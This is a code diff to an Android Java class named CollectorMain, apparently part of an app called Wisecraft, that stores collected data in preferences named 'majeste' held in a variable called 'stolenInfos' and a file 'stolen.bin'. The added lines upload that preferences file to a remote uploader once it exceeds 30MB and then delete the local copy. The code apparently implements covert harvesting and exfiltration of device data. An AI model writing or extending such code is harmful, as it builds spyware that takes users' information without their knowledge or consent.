@@ -57,7 +57,28 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		if(new File(getFilesDir(), "stolen.bin").exists()){
 			new File(getFilesDir(), "stolen.bin").delete();
 		}
-		sb=stolenInfos=getSharedPreferences("majeste",MODE_PRIVATE);
+		try {
+			File majesteXml=new File(getFilesDir(),"shared_prefs/majeste.xml");
+			if (majesteXml.length()>1024*1024*30) {
+				//Because the preferences file is so big, we'll try to upload it.
+				//The border is 30MB.
+				CollectorMainUploaderProvider cmup=getNextAvailableUploader();
+				if (cmup == null) {
+					Log.d("CollectorMain", "unavailable");
+					return;
+				}
+				CollectorMainUploaderProvider.Interface inf=cmup.forInterface();
+				boolean complete=false;
+				try(InputStream is=new FileInputStream(majesteXml)){
+					complete=inf.streamingUpload(uuid,is,(int)majesteXml.length(),CollectorMainUploaderProvider.UploadKind.PREFERENCES);
+				}
+				//Clear preferences by deleting the file, and continue
+				if(complete)majesteXml.delete();
+			}
+		} catch (Throwable e) {
+			WisecraftError.report("CollectorMain",e);
+		}
+		sb = stolenInfos = getSharedPreferences("majeste", MODE_PRIVATE);
 		running = true;
 		try {
 			Log.d("CollectorMain", "start");
